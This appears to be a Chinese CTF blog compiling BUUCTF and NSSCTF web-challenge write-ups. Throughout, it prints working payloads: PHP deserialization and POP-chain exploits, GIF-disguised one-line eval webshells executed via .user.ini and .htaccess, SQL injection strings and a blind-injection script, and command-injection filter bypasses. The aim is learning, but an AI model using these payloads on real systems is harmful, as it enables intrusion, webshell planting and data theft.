$str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125; 通过 get 方式获取 str，如果 str 内容没有不可以打印的字符就进行反序列化操作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125; 可以看到 op 是 === 强比较如果等于字符串 &quot;2&quot; 的话__destruct () 会将其置为 1。然后执行 process ()。在 process () 里，如果 op == &quot;2&quot; 则会执行 read () 和 output ()。 read () 里面是通过 file_get_contents() 方法来读取文件的 如果想读取 flag，需要绕过，防止 op 被置 1，可以传入一个数字 2 来绕过对于 op 的判断。 exp： 123456789101112131415&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op = 2; protected $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; protected $content;&#125;$a = new FileHandler();echo serialize($a)?&gt; 查看网页源代码会发现有一些不可打印字符。是因为序列化后 protected 类型的属性存在不可打印字符。（private 类型的属性序列化后也产生不可打印字符）对于 PHP 版本 7.1+，对属性的类型不敏感，可以把 protected 类型改为 public，消除不可打印字符。 所以 exp 变成： 123456789101112131415&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; public $op = 2; public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; public $content;&#125;$a = new FileHandler();echo serialize($a)?&gt; echo 出来的内容 O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; payload： 1?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; base64 解码得到 &lt;?php $flag='flag&#123;98304339-5192-4713-8bb4-2e5f6dc387e4&#125;'; # [SUCTF 2019]CheckIn 学习链接：https://blog.csdn.net/RABCDXB/article/details/113623796 本题上传一句话木马图片抓包修改后缀，会提示非法后缀，上传.htaccess 文件修改 content-type 会提示不是图片 exif_imagetype:not image! 这里对 exif_imagetype () 函数做一个记录 exif_imagetype (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8) exif_imagetype () 判断一个图像的类型 说明 exif_imagetype ( string $filename ) : int exif_imagetype () 读取一个图像的第一个字节并检查其签名。 检查签名的话就会想到文件头幻术 就是在文件前面添加 GIF89a 以达到绕过的目的，直接上传一句话木马图片会显示 &lt;? in contents! 说明会提取内容来，不能出现 &lt;? 一句话木马图片内容如下： 12GIF86a&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;1&#x27;]);&lt;/script&gt; 然后上传图片 因为上传的是图片马，所以现在还需要一个解析，所以用上了 user.ini 这里做一些.user.ini 的记录： 什么是 .user.ini ？ 这得从 php.ini 说起了。php.ini 是 php 默认的配置文件，其中包括了很多 php 的配置，这些配置中，又分为几种： PHP_INI_SYSTEM 、 PHP_INI_PERDIR 、 PHP_INI_ALL 、 PHP_INI_USER 。这几种模式的区别，官方解释如下： ​ *PHP_INI_模式的定义 模式 含义 PHP_INI_USER 可在用户脚本（例如 ini_set ()）或 Windows 注册表（自 PHP5.3 起）以及.user.ini 中设定 PHP_INI_PERDIR 可在 php.ini，.htaccess 或 httpd.conf 中设定 PHP_INI_SYSTEM 可在 php.ini 或 httpd.conf 中设定 PHP_INI_ALL 可在任何地方设定 其中就提到了，模式为 PHP_INI_USER 的配置项，可以在 ini_set () 函数中设置、注册表中设置，再就是.user.ini 中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在 https://www.php.net/manual/zh/configuration.file.per-user.php 里面解释了。 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER [‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。 这里就很清楚了，.user.ini 实际上就是一个可以由用户 “自定义” 的 php.ini，我们能够自定义的设置是模式为 “PHP_INI_PERDIR 、 PHP_INI_USER” 的设置。（上面表格中没有提到的 PHP_INI_PERDIR 也可以在.user.ini 中设置） 实际上，除了 PHP_INI_SYSTEM 以外的模式（包括 PHP_INI_ALL）都是可以通过.user.ini 来设置的。 而且，和 php.ini 不同的是，.user.ini 是一个能被动态加载的 ini 文件。也就是说我修改了.user.ini 后，不需要重启服务器中间件，只需要等待 user_ini.cache_ttl 所设置的时间（默认为 300 秒），即可被重新加载。 然后我们看到 php.ini 中的配置项，但是，只要稍微敏感的配置项，都是 PHP_INI_SYSTEM 模式的（甚至是 php.ini only 的），包括 disable_functions、extension_dir、enable_dl 等。 不过，我们可以很容易地借助.user.ini 文件来构造一个 “后门”。 Php 配置项中有两个比较有意思的项（下图第一、四个） auto_append_file， 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了 require () 函数。而 auto_append_file 类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini 中： 1auto_prepend_file=muma.jpg muma.jpg 是要包含的文件。所以，可以借助.user.ini 轻松让所有 php 文件都 “自动” 包含某个文件，而这个文件可以是一个正常 php 文件，也可以是一个包含一句话的 webshell。 新建一个.user.ini 内容为 12GIF89aauto_prepend_file=muma.jpg 也需要 GIF89a 来绕过检测 上传，这里是 .user.ini 不能漏了前面那个点，我第一次漏了，一直失败，图片就不改了，一定记住不能少了两个 . 回显路径了，接着上传木马图片 尝试用蚁剑连接，这是连接 index.php 文件，而不知以前遇到的连接一句话木马图片或者一句话木马 php 文件 连接成功后就可以在最高一级目录看到 flag # [GXYCTF2019]BabySQli 查看网页源代码发现一行像是 base 加密的 MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 先 base32 解码然后再 base64 1select * from user where username = &#x27;$name&#x27; 利用 bp 的 repeater 来做题，随便输入一个 name 和 passwd 根据上面的 hint 可以知道是单引号闭合所以 name=admin'#&amp;pw=1 就能闭合，显示 wrong pass！ 判断字段数，这道题 order 被过滤了但是可以大小写绕过 Order by 就可以 1name=1&#x27;union select 1,2,3#&amp;pw=1 可以知道字段数为 3 这题给了源代码 https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli 通过这个可以在 search.php 看到这段代码 12345678if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; echo $flag;![b17](E:/Screenshots/b17.png) &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; 看了很多 wp 得到的解法： 在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。 可以看到在我查询 admin 时，他临时添加了一个 admin 密码是 md5 (123)，这样我们可以尝试使用联合注入来新建一个 admin 的账户密码，混淆 admin 的密码，这道题我用的密码是 md5 (1)，md5 把 1 加密后为 c4ca4238a0b923820dcc509a6f75849b 首先需要查找 admin 再哪个字段，其实猜测就知道 username 一般是在第二个 1' union select 'admin',2,3# 发现 user 错误 1' union select 1,'admin',3# 发现 password 错误，所以第二个字段是 admin name = 后面跟着的不可以是 admin，应该要是不存在数据库中的用户名，为什么需要不存在数据库中的用户名，可以参考这个文章：浅谈 SQL 注入中的 - 1‘ union select 1,2,3#-CSDN 博客应该是和 - 1 同一个道理 payload： 1name=1&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1 flag # [GYCTF2020]Blacklist 查询数据库 payload： 1?inject=1&#x27;;show databases;# 查表名 1?inject=1&#x27;;show tables;# 查 FlagHere 表里的字段名 1?inject=1&#x27;;show columns from FlagHere;# 做个记录（虽然本题没用上）： /**/ 可以绕过检查 例如： 11&#x27;;sel/**/ect flag from FlagHere;# 但是本题什么都没查出来 本题用的是 HANDLER HANDLER ... OPEN 语句打开一个表，使其可以使用后续 HANDLER ... READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER ... CLOSE 或会话终止之前不会关闭 handler 语句，一行一行的浏览一个表中的数据 handler 语句并不具备 select 语句的所有功能。 mysql 专用的语句，并没有包含到 SQL 标准中。 HANDLER 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。 1、 HANDLER tbl_name OPEN 打开一张表，无返回结果，实际上我们在这里声明了一个名为 tb1_name 的句柄。 2、 HANDLER tbl_name READ FIRST 获取句柄的第一行，通过 READ NEXT 依次获取其它行。最后一行执行之后再执行 NEXT 会返回一个空的结果。 3、 HANDLER tbl_name CLOSE 关闭打开的句柄。 4、 HANDLER tbl_name READ index_name = value 通过索引列指定一个值，可以指定从哪一行开始，通过 NEXT 继续浏览。 所以构建 payload： 1?inject=1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;# flag # [CISCN2019 华北赛区 Day2 Web1] Hack World 本题过滤了很多字符，且错误不会先只会回显 bool 值，所以使用盲注，题目蚁剑名牌告诉我们需要的在表 flag 字段名也叫 flag。 尝试写一下脚本，学习链接 https://blog.csdn.net/qq_45691294/article/details/108709683 12345678910111213141516171819202122232425import requestsimport timeurl = &quot;http://50aabff9-6616-4456-b9e1-5af870c44f8b.node5.buuoj.cn:81/index.php&quot;payload = &#123;&quot;id&quot; : &quot;&quot;&#125;result = &quot;&quot;for i in range(1,100): l = 33 r =130 mid = (l+r)&gt;&gt;1 while(l&lt;r): payload[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,mid) html = requests.post(url,data=payload) print(payload) if &quot;Hello&quot; in html.text: l = mid+1 else: r = mid mid = (l+r)&gt;&gt;1 if(chr(mid)==&quot; &quot;): break result = result + chr(mid) print(result)print(&quot;flag: &quot; ,result) flag","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"NSSCTF刷题2","slug":"NSSCTF刷题2","date":"2024-01-20T08:25:14.000Z","updated":"2024-11-08T10:07:17.890Z","comments":true,"path":"2024/01/20/NSSCTF刷题2/","link":"","permalink":"https://dr4x3zz.github.io/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/","excerpt":"# [NISACTF 2022]easyssrf","text":"# [NISACTF 2022]easyssrf 进入本题可以看到 curl 一下，输入 url 查询一下就可以回显页面，可以尝试输入 flag，页面告诉我们 都说了这里看不了flag。。但是可以看看提示文件：/fl4g 输入 /fl4g，让我们尝试其他路径，使用 file 协议读取文件？ file:///fl4g file:///fl4g 的快照如下： 你应该看看除了index.php，是不是还有个ha1x1ux1u.php stristr () 函数用于搜索一个字符串在另一个字符串中第一次出现的位置。(不区别大小写) 语法 1stristr(str, search, before_search) 参数 str - 要搜索的字符串 search - 要搜索的字符串 before_search - 一个布尔值，默认值为 “false”。如果设置为 “true”，则返回第一次出现搜索参数之前的字符串部分。 阅读代码发现 file 被禁用，使用 php 伪协议 php://filter payload: 1ha1x1ux1u.php?file=php://filter/read=convert.base64-encode/resource=/flag 解码得到 flag NSSCTF # [NCTF 2018] 签到题 bp 抓包访问 index.php，flag 藏在响应头里 # [BJDCTF 2020]easy_md5 进入页面只有一个白色查询框，输入 1，可以看见 url 上多了 password=1，可能和注入以及题目说的 md5 结合起来，弱比较？ 在响应头看到 hint 先记录一下 md5 () 这个函数 语法 md5(string, raw) 参数 描述 string 必须。要计算的字符串。 raw 可选。默认不写为 FALSE。32 位 16 进制的字符串TURE。16 位原始二进制格式的字符串 当 raw 为 ture 时，返回的原始二进制不是 0 和 1 构成的，而是’or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 这种 上面这一长串是 ffifdyop 这串字符通过 md5 (,true) 加密后得到的，因为有’or’6… 可以和 hint 中的 sql 语句构成一条常规的 sql 注入从而绕过 测试 1echo md5(&quot;ffifdyop&quot;, true) ok 输入 ffifdyop 查看网页源代码 这就是一个 md5 弱类型比较，也可以数组绕过，（直接访问 levell14.php 也行？？？？？？。。。。。。） 根据提示 payload： 1url/levell14.php?$a=240610708&amp;&amp;$b=s878926199a 得到新的页面 md5 无法处理数组，所以使用数组绕过 md5 的比较 post aram1[]=1&amp;param2[]=2 得到 flagNSSCTF # [SWPUCTF 2021 新生赛] easyupload3.0 记录一下.htaccess 文件 htaccess 文件是 Apache 服务中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮助我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 .htaccess 文件内容： SetHandler application/x-httpd-php 意思是设置当前目录所有文件都是用 php 解析，那么无论上传任何一个文件，内容只要符合 php 的语言规范，就能够当作 php 代码执行。不符合规则报错 先上传一个 htaccess 文件，再上传一个包含一句话木马的 jpg 文件 htaccess 文件内容为 123&lt;FilesMatch &quot;jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 包含一句话木马就是 txt 文件写一段一句话木马然后后缀名改为 jpg 就好了 上传成功后可以看到路径，蚁剑连接，在 html 文件夹下有 flag.php，里面就是 flag 了 NSSCTF # [SWPUCTF 2021 新生赛] hardrce 本题是有两个 preg_match 函数去过滤掉一些字符和所有的英文字母，如果传入的 wllm 符合要求就会被 eval 执行 这里记录一些 url 编码取反绕过正则表达式 的一些知识点 1、url 编码取反绕过：就是将 php 代码 url 编码后取反，我们传入参数后服务端进行 url 解码，这时候由于取反后，会解码成不可打印字符，这样我们就会绕过 1234&lt;?phpecho urlencode(&#x27;phpinfo&#x27;);echo urlencode(~&#x27;phpinfo&#x27;);?&gt; 2、对于 php，形如 (func_name)()，其中 func_name 可以是字符串，会执行这个 func 例如 1(~%8F%97%8F%96%91%99%90)() 相当于 1phpinfo() 了解完这些我们尝试构建 payload 获取目录 1?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); 12(~%8C%86%8C%8B%9A%92) # (~&#x27;system&#x27;)(~%93%8C%DF%D0) # (~&#x27;ls /&#x27;) 尝试获取 flllllaaaaaaggggggg 里的内容 12345&lt;?phpecho urlencode(~&#x27;system&#x27;); #%8C%86%8C%8B%9A%92echo urlencode(~&#x27;cat /flllllaaaaaaggggggg&#x27;); #%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98?&gt; payload 如下： 1?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98); 得到 flag NSSCTF # [SWPUCTF 2021 新生赛] error 比较常规的报错注入，熟悉一下 payload 获得当前数据库 1?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select database())))) -- s 爆库 1?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select group_concat(schema_name) from information_schema.schemata)))) -- s 但是单次查询的字符长度受限最好是搭配 substr 限长和控制回显的是哪一部分，本题没用上别的数据库，就不把所有数据库都查出来了 爆出 test_db 数据库下的所有表 1?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;)))) -- s 爆出 test_tb 的所有字段名 1?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27; and table_schema=&#x27;test_db&#x27;)))) -- s 查询 flag！ 1?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select substr((select flag from test_tb),1,31))))) -- s #前31位 1?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select substr((select flag from test_tb),31,62))))) -- s #剩下的 # [GXYCTF 2019]Ping Ping Ping 他说 why not try bjut.edu.cn 那就尝试输入 bjut.edu.cn 回显内容长这样 上面有个问句 php 可以执行系统函数？那就尝试使用系统函数例如 ls 等 输入 1;ls 得到有 index.php 和 flag.php 空格被过滤了，那就用 $IFS$1 来替代空格 1?ip=1;cat$IFS$1index.php 查看源代码 可以看到被过滤的字符 做一些记录： 第一个 if 里的 \\x 是 16 进制字符开头 第二个 if 匹配的是空格 第三个是 bash 第四个是 flag。 . 是匹配一个不是 \\n 的字符， * 是前一个匹配符匹配 0 到无数次。就是一个字符串里面 flag 这四个字符不能顺序出现在任意位置中，不管中间间隔了什么，他们连起来就是 flag，就会输出 die (“fxck your flag!”); payload： 1?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php 然后查看网页源代码 NSSCTF # [SWPUCTF 2021 新生赛] pop 题目： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123; private $admin = &#x27;aaa&#x27;; protected $passwd = &#x27;123456&#x27;; public function Getflag()&#123; if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123; include(&#x27;flag.php&#x27;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &#x27;nono&#x27;; &#125; &#125;&#125;class w22m&#123; public $w00m; public function __destruct()&#123; echo $this-&gt;w00m; &#125;&#125;class w33m&#123; public $w00m; public $w22m; public function __toString()&#123; $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); return 0; &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);?&gt; 还没完全 get 到 pop 链的做法，还是多刷点题慢慢体会吧 exp: 123456789101112131415161718192021222324252627282930&lt;?phpclass w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;;&#125;class w22m&#123; public $w00m; public function __destruct()&#123; echo $this-&gt;w00m; &#125;&#125;class w33m&#123; public $w00m; public $w22m; public function __toString()&#123; $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); return 0; &#125;&#125;$a = new w22m();$a-&gt;w00m = new w33m();$a-&gt;w00m-&gt;w00m = new w44m();$a-&gt;w00m-&gt;w22m = &#x27;Getflag&#x27;;echo urlencode(serialize($a))?&gt; payload： 1?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D NSSCTF 这里再记录一下魔术方法，加深一下印象 __sleep () // 使用 serialize 时触发 __destruct () // 对象被销毁时触发 __call () // 在对象上下文中调用不可访问的方法时触发 __callStatic () // 在静态上下文中调用不可访问的方法时触发 __get () // 用于从不可访问的属性读取数据 __set () // 用于将数据写入不可访问的属性 __isset () // 在不可访问的属性上调用 isset () 或 empty () 触发 __unset () // 在不可访问的属性上使用 unset () 时触发 __toString () // 把类当作字符串使用时触发 __invoke () // 当脚本尝试将对象调用为函数时触发 # [LitCTF 2023]Ping 输入 127.0.0.1;ls 前端？？？直接禁用 JavaScript 再次尝试 禁用完就可以了 直接 127.0.0.1;cat /flag NSSCTF # [SWPUCTF 2021 新生赛] sql 网页提示参数是 wllm，wllm=1 有回显 name 和 password wllm=1’ 1You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 闭合单引号 存在过滤？用 ?wllm=1'%23 就回显正常了 尝试 1?wllm=-1&#x27; or 1=1%23 发现是非法操作，可能是空格被过滤了，把空格替换成 /**/ 或者 + 12?wllm=1&#x27;/**/order/**/by/**/3%23 #回显正常?wllm=1&#x27;/**/order/**/by/**/4%23 #Unknown column &#x27;4&#x27; in &#x27;order clause&#x27; 联合注入 union select 查找回显位置 1?wllm=-1&#x27;/**/union/**/select/**/1,2,3%23 查找当前数据库 1?wllm=-1&#x27;/**/union/**/select/**/1,2,database()%23 查找当前数据库所有表名，等于号换成单词 like 1?wllm=-1&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23 爆字段 1?wllm=-1&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()%23 获取 flag 1?wllm=-1&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23 只有半截，搭配着 substr 来获取 flag，本题 substr 好像被过滤了，用 mid 函数 12?wllm=-1&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),20,20)/**/from/**/LTLT_flag%23?wllm=-1&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),30,20)/**/from/**/LTLT_flag%23 # [SWPUCTF 2021 新生赛] finalrce 网上查了，本题用的是 linux 里 tee 命令，记录一下 tee 将想要执行的命令写入到一个文件里面，然后再去访问这个文件，以此来执行这个命令。 本题 ls 被禁用了，|\\s 可以替代 ls，| 是执行以下命令的意思 这里尝试获取目录 1?url=l\\s / | tee 1.txt 获取 flllllaaaaaaggggggg 里的内容 本题禁用了 cat 但是没有禁用 tac，tac 就是 cat 反过来，反向读取文件，把文件的最后一行放在第一行 因为禁用了 la，所以在 l 和 a 之间加一个 \\，不然就没有办法绕过 1?url=tac /flllll\\aaaaaaggggggg | tee 2.txt 得到 flag # [SWPUCTF 2022 新生赛] ez_ez_php 1?file=php://filter/read=convert.base64-encode/resource=flag.php 删去.php 1?file=php://filter/read=convert.base64-encode/resource=flag NSSCTF # [鹏城杯 2022] 简单包含 POST flag=/var/www/html/flag.php 触发 waf，这里简要记录一下 waf WAF 全称叫 Web Application Firewall，和传统防火墙的区别是，它是工作在应用层的防火墙，主要对 web 请求 / 响应进行防护。 Web 应用防火墙可以防止 web 应用免受各种常见攻击，如 SQL 注入，跨站脚本漏洞 XSS 等。WAF 也能够监测并过滤掉某些可以让应用遭受 DOS（拒绝服务）攻击的流量。WAF 会在 HTTP 流量抵达应用服务器之前检测可疑访问，同时，他们也能防止从 web 应用获取某些未经授权的数据。 这里尝试一下 php 伪协议 1flag=php://filter/read=convert.base64-encode/resource=flag.php 还是触发 waf，那读取一下 index.php 1flag=php://filter/read=convert.base64-encode/resource=index.php 12345678910111213141516&lt;?php$path = $_POST[&quot;flag&quot;];if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123; echo &#x27;nssctf waf!&#x27;;&#125; else &#123; @include($path);&#125;?&gt;&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;__FILE__&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;include(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_POST&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #FF8000&quot;&gt;//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;br /&gt; flag 被过滤了，但是这个 if 条件有个很明显的绕过，&amp;&amp; 说明要同时满足两个条件，而且第一个条件是字数 &lt; 800 的条件，只要超过就不满足条件，就可以获取 flag 1a=a....(800个a)&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php NSSCTF","categories":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://dr4x3zz.github.io/categories/NSSCTF/"}],"tags":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://dr4x3zz.github.io/tags/NSSCTF/"}]},{"title":"NSSCTF刷题1","slug":"NSSCTF刷题1","date":"2023-09-17T13:30:13.000Z","updated":"2024-11-08T10:07:09.331Z","comments":true,"path":"2023/09/17/NSSCTF刷题1/","link":"","permalink":"https://dr4x3zz.github.io/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/","excerpt":"# [SWPUCTF 2021 新生赛] easyupload2.0","text":"# [SWPUCTF 2021 新生赛] easyupload2.0 上传一句话木马图片，抓包将后缀名改为 php 显示 php 是不行的 所以将后缀名改为 phtml 后 上传成功，路径也爆出了 用蚁剑连接 在上级目录可以找到 flag.php NSSCTF # [suctf 2019]EasySQL 先输入 1 查看有回显 字母无回显 单引号注入，回显提示不一样，猜测有注入点 后面尝试盲注报错注入都不行，试试堆叠注入 查看数据库 查看表名 查看 flag 字段 失败 通过上面我们可以发现表名和字段名只有一个 Flag，尝试怎么查看这个 Flag 查阅了网上的 wp，比较相对来说简单的解法是用到 sql_mode=PIPES_AS_CONCAT 将 || 作为字符串连接符，因此需要在语句中更改其配置 sql_mode=PIPES_AS_CONCAT 时即可 Payload:1;set sql_mode=PIPES_AS_CONCAT;select 1 这题内置的 sql 语句为： 1sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;; 所以更改配置后 || 变成了 CONCAT () 的用法了 拼接完之后：select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag 相当于是 select 1 from Flag 和 select flag from Flag 这题有两种解法一种是猜测院代码，第二种是更改配置 sql_mode=PIPES_AS_CONCAT，我觉得不管怎么样都要猜测到函数用到了 || 得到 flag # [鹤城杯 2021] EasyP 123456789101112131415161718192021222324252627&lt;?phpinclude &#x27;utils.php&#x27;;if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125;&#125;if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;hacker :)&quot;);&#125;if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; exit(&quot;hacker :)&quot;);&#125;if (isset($_GET[&#x27;show_source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;else&#123; show_source(__FILE__);&#125;?&gt; $_SERVE['PHP_SELF'] 读取当前执行脚本文件名，就是读取文件夹下的一个文件 $_SERVER['REQUEST_URI'] 是取得当前 URL 的路径地址，就是剔除域名剩下的就是 URL 路径地址，无论后面的数据请求是否正确都成立。 basename() 三个变量或者函数可以看这篇文章：https://blog.csdn.net/qq_51295677/article/details/124237892 123if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; exit(&quot;hacker :)&quot;);&#125; 这个正则可以使用 [ 空格 . 上面的四个字符取一即可，都可以被处理成_ 123if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;]))&#123; exit(&quot;hacker :)&quot;);&#125; 这个使用中文绕过 题解可以参考上面的连接和这个链接：https://www.cnblogs.com/FPointzero/p/16438478.html payload： 1index.php/utils.php/嗯哼?show%20source=1 # [LitCTF 2023]Http pro max plus 页面显示只允许本地访问，第一个想到的肯定是 xff，抓包 这里抓完包最下面有两行空着的，不能漏了 XFF 不行那就换一个，添加 Client-Ip 1Client-Ip: 127.0.0.1 添加 Referer 1Referer: pornhub.com 修改 User-Agent 1User-Agent: Chrome 添加 Via 1Via: Clash.win 访问 wtfwtfwtfwtf.php 访问 sejishikong.php 拿到 flag NSSCTF # [NSSCTF 2022 Spring Recruit]babyphp 123456789101112131415161718192021![b54](E:/Screenshots/b54.png) 